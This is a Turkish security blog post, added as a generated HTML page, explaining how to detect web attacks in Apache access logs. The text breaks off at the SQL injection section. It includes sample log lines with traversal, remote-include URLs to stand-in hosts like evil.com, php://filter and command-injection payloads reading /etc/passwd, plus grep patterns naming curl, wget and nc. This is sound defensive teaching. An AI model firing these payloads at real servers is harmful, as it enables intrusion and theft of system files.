@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Apache Web Sunucusunda Saldırı Tespiti · Yusuf Talha ARABACI
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Yusuf Talha ARABACI">
+<meta name="description" content="
+
+  Apache Web Sunucusunda Saldırı Tespiti
+  
+    
+    Başlık Linki
+  
+
+Bu yazımda, web saldırı türlerini açıklayacağım ve apache web sunucu erişim logları üzerinden bu saldırıları nasıl tespit edebileceğimize değineceğim.
+
+Günümüzde web uygulamaları ve siteler, farklı türlerde siber saldırılara maruz kalmaktadır. Bu saldırıların erken tespiti, güvenlik önlemlerinin etkinliği ve sistemin sürekliliği açısından büyük önem taşır. Apache Web Sunucusu, dünya genelinde en yaygın kullanılan web sunucularından biridir ve bu nedenle saldırıların izlenmesi ve tespiti için doğru yöntemlerin uygulanması gerekmektedir.">
+<meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
+  <meta name="twitter:title" content="Apache Web Sunucusunda Saldırı Tespiti">
+  <meta name="twitter:description" content="Apache Web Sunucusunda Saldırı TespitiBaşlık LinkiBu yazımda, web saldırı türlerini açıklayacağım ve apache web sunucu erişim logları üzerinden bu saldırıları nasıl tespit edebileceğimize değineceğim.
+Günümüzde web uygulamaları ve siteler, farklı türlerde siber saldırılara maruz kalmaktadır. Bu saldırıların erken tespiti, güvenlik önlemlerinin etkinliği ve sistemin sürekliliği açısından büyük önem taşır. Apache Web Sunucusu, dünya genelinde en yaygın kullanılan web sunucularından biridir ve bu nedenle saldırıların izlenmesi ve tespiti için doğru yöntemlerin uygulanması gerekmektedir.">
+
+<meta property="og:url" content="http://localhost:1313/tr/posts/2025/06/apache-web-sunucusunda-sald%C4%B1r%C4%B1-tespiti/">
+  <meta property="og:site_name" content="Yusuf Talha ARABACI">
+  <meta property="og:title" content="Apache Web Sunucusunda Saldırı Tespiti">
+  <meta property="og:description" content="Apache Web Sunucusunda Saldırı TespitiBaşlık LinkiBu yazımda, web saldırı türlerini açıklayacağım ve apache web sunucu erişim logları üzerinden bu saldırıları nasıl tespit edebileceğimize değineceğim.
+Günümüzde web uygulamaları ve siteler, farklı türlerde siber saldırılara maruz kalmaktadır. Bu saldırıların erken tespiti, güvenlik önlemlerinin etkinliği ve sistemin sürekliliği açısından büyük önem taşır. Apache Web Sunucusu, dünya genelinde en yaygın kullanılan web sunucularından biridir ve bu nedenle saldırıların izlenmesi ve tespiti için doğru yöntemlerin uygulanması gerekmektedir.">
+  <meta property="og:locale" content="tr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-01T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/images/profile.jpeg">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/tr/posts/2025/06/apache-web-sunucusunda-sald%C4%B1r%C4%B1-tespiti/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/tr/">
+      Yusuf Talha ARABACI
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/posts/">Yazılar</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/series/">Seriler</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/about/">Hakkımda</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/posts/2025/06/intrusion-detection-on-apache-web-server/">English</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/tr/posts/2025/06/apache-web-sunucusunda-sald%C4%B1r%C4%B1-tespiti/">
+              Apache Web Sunucusunda Saldırı Tespiti
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-06-01T00:00:00Z">
+                Haziran 1, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              18 dakikalık okuma
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <hr>
+<h3 id="apache-web-sunucusunda-saldırıtespiti">
+  Apache Web Sunucusunda Saldırı Tespiti
+  <a class="heading-link" href="#apache-web-sunucusunda-sald%c4%b1r%c4%b1tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Bu yazımda, web saldırı türlerini açıklayacağım ve apache web sunucu erişim logları üzerinden bu saldırıları nasıl tespit edebileceğimize değineceğim.</p>
+<p><img src="/images/1_gtYIO-nyJZoIwSFEi_9xQA.png" alt=""></p>
+<p>Günümüzde web uygulamaları ve siteler, farklı türlerde siber saldırılara maruz kalmaktadır. Bu saldırıların erken tespiti, güvenlik önlemlerinin etkinliği ve sistemin sürekliliği açısından büyük önem taşır. Apache Web Sunucusu, dünya genelinde en yaygın kullanılan web sunucularından biridir ve bu nedenle saldırıların izlenmesi ve tespiti için doğru yöntemlerin uygulanması gerekmektedir.</p>
+<h3 id="apache-erişim-loglarınedir">
+  Apache Erişim Logları Nedir?
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nedir">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Apache, sunucuya gelen her HTTP isteğini erişim loglarında kaydeder. Bu loglar, istek yapan IP adresi, istek zamanı, istenen dosya veya kaynak, kullanılan HTTP metodu, durum kodu gibi önemli bilgileri içerir. Erişim logları, sistemde gerçekleşen aktivitelerin izlenmesi ve analiz edilmesi için birincil veri kaynağıdır.</p>
+<p>Apache erişim logları genellikle <code>/var/log/apache2/access.log</code> (veya benzeri) dosyasında bulunur. Her istek satırı şu bilgileri içerir: IP adresi, tarih-saat, istek tipi (GET, POST), istenen URL, HTTP protokolü, yanıt kodu,</p>
+<h3 id="tespit-için-kullanılabilecek-yöntemler">
+  Tespit İçin Kullanılabilecek Yöntemler
+  <a class="heading-link" href="#tespit-i%c3%a7in-kullan%c4%b1labilecek-y%c3%b6ntemler">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<h3 id="manuel-loganalizi">
+  Manuel Log Analizi
+  <a class="heading-link" href="#manuel-loganalizi">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><code>grep</code>, <code>awk</code> gibi Linux komutları kullanılarak log dosyalarında şüpheli aktiviteler aranabilir. Örneğin:</p>
+<pre tabindex="0"><code>grep -iE &#34;union|select|drop|script|alert|../|login|admin&#34; /var/log/apache2/access.log
+</code></pre><h3 id="otomatik-izleme-ve-uyarı-sistemleri">
+  Otomatik İzleme ve Uyarı Sistemleri
+  <a class="heading-link" href="#otomatik-izleme-ve-uyar%c4%b1-sistemleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Fail2Ban:</strong> Belirlenen kurallara göre şüpheli IP’leri engelleyebilir.</li>
+<li><strong>ModSecurity:</strong> Apache üzerinde çalışan Web Application Firewall (WAF) olarak saldırıları gerçek zamanlı tespit eder ve engeller.</li>
+<li><strong>Log Analiz Araçları:</strong> GoAccess, AWStats gibi araçlar logları görselleştirip analiz yapmayı kolaylaştırır.</li>
+</ul>
+<hr>
+<h3 id="dizin-gezinme-directory-traversal">
+  Dizin Gezinme (Directory Traversal)
+  <a class="heading-link" href="#dizin-gezinme-directory-traversal">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Dizin Gezinme saldırısı, bir saldırganın web sunucusunda yetkisiz olarak üst dizinlere veya hassas dosyalara erişmeye çalıştığı saldırı türüdür. Amaç, sunucudaki kritik dosyaları (örneğin <code>/etc/passwd</code>, yapılandırma dosyaları) elde etmektir.</p>
+<h4 id="dizin-gezinme-saldırısının-göstergeleri-indikatörleri">
+  Dizin Gezinme Saldırısının Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#dizin-gezinme-sald%c4%b1r%c4%b1s%c4%b1n%c4%b1n-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken göstergeler:</p>
+<ul>
+<li>URL parametrelerinde veya istek yollarında <code>../</code> veya benzeri dizin atlama ifadeleri</li>
+<li><code>..%2F</code> (URL encoded <code>../</code>) gibi kodlanmış karakterler</li>
+<li>Hassas dosyalara erişim denemeleri: <code>/etc/passwd</code>, <code>/boot.ini</code>, <code>/windows/win.ini</code> gibi dosya isimleri</li>
+<li>Anormal uzun URL istekleri veya çok sayıda dizin atlama örüntüsü</li>
+<li>Sunucu hataları (403 Forbidden, 404 Not Found) artışı</li>
+</ul>
+<h4 id="apache-erişim-loglarında-dizin-gezinmetespiti">
+  Apache Erişim Loglarında Dizin Gezinme Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-dizin-gezinmetespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Dizin Gezinme saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.200 - - [01/Jun/2025:12:00:10 +0300] &#34;GET /../../../../etc/passwd HTTP/1.1&#34; 403 723 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.201 - - [01/Jun/2025:12:00:30 +0300] &#34;GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&#34; 404 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.202 - - [01/Jun/2025:12:01:05 +0300] &#34;GET /admin/../../boot.ini HTTP/1.1&#34; 403 400 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “../|..%2F|etc/passwd|boot.ini|win.ini” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="file-upload-dosyayükleme">
+  File Upload (Dosya Yükleme)
+  <a class="heading-link" href="#file-upload-dosyay%c3%bckleme">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>File Upload saldırısı, bir saldırganın web uygulamasının dosya yükleme özelliğini kötüye kullanarak zararlı dosyalar yüklemesiyle gerçekleşir. Bu dosyalar genellikle web sunucusunda çalıştırılabilir komutlar içeren scriptler olabilir.</p>
+<p>Webshell, saldırganların bir web sunucusuna yükleyip çalıştırabildiği küçük kötü amaçlı komut dosyalarıdır. Genellikle PHP, ASP, JSP gibi sunucu tarafı dillerle yazılır. Webshell, saldırganlara sunucuda komut çalıştırma, dosya yükleme/indirme, veri çalma, arka kapı oluşturma gibi geniş yetkiler sağlar.</p>
+<p>Amaç, sunucuya kötü amaçlı kod yerleştirip kontrolü ele geçirmek, veri sızdırmak veya sistemi bozmak olabilir.</p>
+<h4 id="file-upload-saldırısı-göstergeleri-indikatörleri">
+  File Upload Saldırısı Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#file-upload-sald%c4%b1r%c4%b1s%c4%b1-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li><code>/upload</code>, <code>/uploads</code>, <code>/file-upload</code>, <code>/image-upload</code> gibi dosya yükleme endpointlerine yapılan istekler</li>
+<li>Yüklenen dosya adlarında şüpheli uzantılar: <code>.php</code>, <code>.exe</code>, <code>.jsp</code>, <code>.asp</code>, <code>.phtml</code>, <code>.pl</code> gibi</li>
+<li>Uzun veya karmaşık dosya isimleri (örneğin <code>shell.php</code>, <code>cmd.jsp</code>, <code>image.jpg.php</code>)</li>
+<li>HTTP metodunun genellikle POST olması ve içerik tipinin <code>multipart/form-data</code> olması</li>
+<li>Aynı IP’den kısa sürede çok sayıda dosya yükleme denemesi</li>
+<li>Yükleme sonrası yapılan şüpheli GET istekleri ile dosyanın çalıştırılmaya çalışılması</li>
+</ul>
+<h4 id="apache-erişim-loglarında-file-uploadtespiti">
+  Apache Erişim Loglarında File Upload Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-file-uploadtespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>File Upload saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.350 - - [01/Jun/2025:23:10:45 +0300] &#34;POST /upload HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.350 - - [01/Jun/2025:23:11:00 +0300] &#34;GET /uploads/shell.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.351 - - [01/Jun/2025:23:12:10 +0300] &#34;POST /file-upload HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -E “.php|.jsp|.asp|.exe|.phtml” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="rfi-remote-file-inclusion">
+  RFI (Remote File Inclusion)
+  <a class="heading-link" href="#rfi-remote-file-inclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>RFI, web uygulamalarında kötü niyetli bir saldırganın, uzak bir sunucudan zararlı dosyaları (genellikle PHP, JavaScript gibi) dahil ederek (include) çalıştırmasına olanak sağlayan bir saldırı türüdür.</p>
+<p>Bu saldırı, özellikle PHP gibi include(), require() fonksiyonlarını kullanıcı girdisiyle doğrudan kullanan zayıf uygulamalarda görülür. Saldırgan, uzak bir dosyanın URL’sini parametre olarak verip sunucuya zararlı kodu çalıştırtırabilir.</p>
+<h4 id="rfi-saldırısının-göstergeleri-indikatörleri">
+  RFI Saldırısının Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#rfi-sald%c4%b1r%c4%b1s%c4%b1n%c4%b1n-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında aşağıdaki işaretlere dikkat etmek gerekir:</p>
+<ul>
+<li>URL veya parametrelerde <code>http://</code>, <code>https://</code> gibi uzak dosya adresleri</li>
+<li>Parametrelerde <code>.php</code>, <code>.txt</code>, <code>.inc</code> gibi dosya uzantıları</li>
+<li><code>include=</code>, <code>file=</code>, <code>page=</code>, <code>template=</code> gibi parametre isimlerinde uzaktan dosya çağrısı</li>
+<li>Anormal uzun URL ve karmaşık parametre yapıları</li>
+<li>500 Internal Server Error gibi hata kodları</li>
+</ul>
+<h4 id="apache-erişim-loglarında-rfitespiti">
+  Apache Erişim Loglarında RFI Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-rfitespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>RFI saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.210 - - [01/Jun/2025:12:30:10 +0300] &#34;GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.211 - - [01/Jun/2025:12:31:05 +0300] &#34;GET /include.php?file=https://evil.com/malware.php HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.212 - - [01/Jun/2025:12:32:15 +0300] &#34;GET /template.php?template=http://attacker.com/bad.inc HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “<a href="http://%7chttps://%7cinclude=%7cfile=%7cpage=%7ctemplate="  class="external-link" target="_blank" rel="noopener">http://|https://|include=|file=|page=|template=</a>&quot; /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="lfi-local-file-inclusion">
+  LFI (Local File Inclusion)
+  <a class="heading-link" href="#lfi-local-file-inclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>LFI, web uygulamasında kullanıcıdan alınan girdilerle sunucu üzerindeki yerel dosyaların (örneğin sistem dosyaları, yapılandırma dosyaları) izinsiz olarak dahil edilip çalıştırılmasına olanak veren bir saldırı türüdür.</p>
+<p>Bu saldırı, özellikle include(), require() gibi fonksiyonlar kullanıcı girdisiyle doğrudan çağrıldığında ortaya çıkar. Amaç genellikle hassas dosyalara erişmek veya sunucu üzerinde komut çalıştırmaktır.</p>
+<h4 id="lfi-saldırısının-göstergeleri-indikatörleri">
+  LFI Saldırısının Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#lfi-sald%c4%b1r%c4%b1s%c4%b1n%c4%b1n-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL veya parametrelerde <code>../</code> gibi dizin atlama karakterleri (Directory Traversal ile benzerlik gösterir)</li>
+<li><code>php://</code>, <code>data://</code>, <code>expect://</code> gibi PHP wrapper ifadeleri</li>
+<li>Sistem dosyaları: <code>/etc/passwd</code>, <code>/proc/self/environ</code>, <code>/var/log/apache2/access.log</code> gibi dosya isimleri</li>
+<li>Parametrelerde <code>include=</code>, <code>page=</code>, <code>file=</code> gibi dosya dahil etmeye yönelik anahtar kelimeler</li>
+<li>Anormal uzun ve karmaşık URL yapıları</li>
+<li>403 Forbidden veya 500 Internal Server Error gibi hata kodları</li>
+</ul>
+<h4 id="apache-erişim-loglarında-lfitespiti">
+  Apache Erişim Loglarında LFI Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-lfitespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>LFI saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.220 - - [01/Jun/2025:13:00:10 +0300] &#34;GET /index.php?page=../../../../etc/passwd HTTP/1.1&#34; 403 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.221 - - [01/Jun/2025:13:01:25 +0300] &#34;GET /load.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.222 - - [01/Jun/2025:13:02:05 +0300] &#34;GET /view.php?include=../proc/self/environ HTTP/1.1&#34; 403 400 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “../|php://|data://|expect://|include=|page=|file=” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="brute-force-kabakuvvet">
+  Brute Force (Kaba Kuvvet)
+  <a class="heading-link" href="#brute-force-kabakuvvet">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Brute Force saldırısı, bir saldırganın bir kullanıcı hesabına ya da sisteme erişim sağlamak için çok sayıda kullanıcı adı ve parola kombinasyonunu otomatik ve hızlı şekilde denemesiyle gerçekleşir. Amaç, doğru kimlik bilgilerini bularak yetkisiz erişim elde etmektir.</p>
+<p>Bu saldırı genellikle login (giriş) sayfalarına yöneliktir ve otomatik araçlarla gerçekleşir.</p>
+<h4 id="brute-force-saldırısının-göstergeleri-indikatörleri">
+  Brute Force Saldırısının Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#brute-force-sald%c4%b1r%c4%b1s%c4%b1n%c4%b1n-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında aşağıdaki işaretler Brute Force saldırısına işaret edebilir:</p>
+<ul>
+<li>Aynı IP adresinden kısa sürede çok sayıda POST (genellikle login) isteği</li>
+<li>Farklı kullanıcı adları veya parola denemeleri ile tekrarlayan login girişimleri</li>
+<li>Artan sayıda 401 Unauthorized veya 403 Forbidden HTTP yanıt kodları</li>
+<li>Belirli endpointlerde (örneğin <code>/login</code>, <code>/wp-login.php</code>, <code>/admin/login.php</code>) yoğun istek trafiği</li>
+<li>User-Agent veya IP adreslerinde tekrar eden kalıplar</li>
+</ul>
+<h4 id="apache-erişim-loglarında-brute-forcetespiti">
+  Apache Erişim Loglarında Brute Force Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-brute-forcetespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Brute Force saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.250 - - [01/Jun/2025:14:10:01 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.250 - - [01/Jun/2025:14:10:03 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.250 - - [01/Jun/2025:14:10:05 +0300] &#34;POST /login.php HTTP/1.1&#34; 401 530 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.250 - - [01/Jun/2025:14:10:07 +0300] &#34;POST /login.php HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>awk ‘$7 == “/login.php” &amp;&amp; $9 == 401 {print $1}’ /var/log/apache2/access.log | sort | uniq -c | sort -nr | head</p>
+</blockquote>
+<hr>
+<h3 id="komut-enjeksiyonu-command-injection">
+  Komut Enjeksiyonu (Command Injection)
+  <a class="heading-link" href="#komut-enjeksiyonu-command-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Komut enjeksiyonu, bir saldırganın web uygulamasına zararlı işletim sistemi komutları enjekte ederek, sunucuda yetkisiz komutlar çalıştırmasına olanak veren bir güvenlik açığıdır.</p>
+<p>Bu saldırı, özellikle kullanıcı girdilerinin doğrulanmadığı ve doğrudan işletim sistemi komutlarını çalıştıran fonksiyonlara (örneğin system(), exec(), shell_exec()) geçirildiği durumlarda ortaya çıkar.</p>
+<p>Amaç, sunucuyu ele geçirmek, dosya içeriği okumak veya değiştirmek, ya da başka zararlı işlemler gerçekleştirmektir.</p>
+<h4 id="komut-enjeksiyonu-göstergeleri-indikatörleri">
+  Komut Enjeksiyonu Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#komut-enjeksiyonu-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL veya parametrelerde <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>`</code> (backtick) gibi komut ayırıcı karakterler</li>
+<li><code>curl</code>, <code>wget</code>, <code>nc</code>, <code>bash</code>, <code>sh</code>, <code>python</code> gibi sistem komut isimleri</li>
+<li>Parametrelerde anormal uzun veya karmaşık yapılar</li>
+<li>Sunucu tarafında hata (500 Internal Server Error) kodları artışı</li>
+<li>Komut çıktısını gösteren veya etkileyen istekler</li>
+</ul>
+<h4 id="apache-erişim-loglarında-komut-enjeksiyonu-tespiti">
+  Apache Erişim Loglarında Komut Enjeksiyonu Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-komut-enjeksiyonu-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Komut Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.230 - - [01/Jun/2025:13:30:10 +0300] &#34;GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.231 - - [01/Jun/2025:13:31:20 +0300] &#34;GET /exec.php?cmd=ls%20-l%20%26%26%20cat%20/etc/passwd HTTP/1.1&#34; 500 2048 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.232 - - [01/Jun/2025:13:32:05 +0300] &#34;GET /shell.php?cmd=`whoami` HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “;|&amp;&amp;|\||`|curl|wget|nc|bash|sh|python” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="sql-enjeksiyon-sql-injection">
+  SQL Enjeksiyon (SQL Injection)
+  <a class="heading-link" href="#sql-enjeksiyon-sql-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>SQL Enjeksiyon, saldırganın web uygulamasına zararlı SQL komutları enjekte ederek, uygulamanın veritabanını manipüle ettiği bir saldırı türüdür. Amaç; veritabanından gizli bilgileri çalmak, verileri değiştirmek veya silmek olabilir.</p>
+<h4 id="sql-enjeksiyonun-göstergeleri">
+  SQL Enjeksiyonun Göstergeleri
+  <a class="heading-link" href="#sql-enjeksiyonun-g%c3%b6stergeleri">
